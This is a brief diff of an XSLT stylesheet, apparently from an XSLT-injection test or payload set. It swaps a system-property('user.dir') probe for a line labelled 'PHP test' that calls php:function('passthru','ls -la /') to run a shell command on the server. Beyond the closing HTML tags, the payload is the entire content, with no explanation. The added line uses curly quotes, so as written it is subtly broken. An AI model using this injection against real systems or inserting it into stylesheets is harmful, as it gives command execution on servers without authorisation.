@@ -14,6 +14,6 @@
   </div>
 </xsl:for-each>
 </body>
-
- select="system-property('user.dir')" => <xsl:value-of select="system-property('user.dir')"/>
+  
+PHP test => <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
 </html>
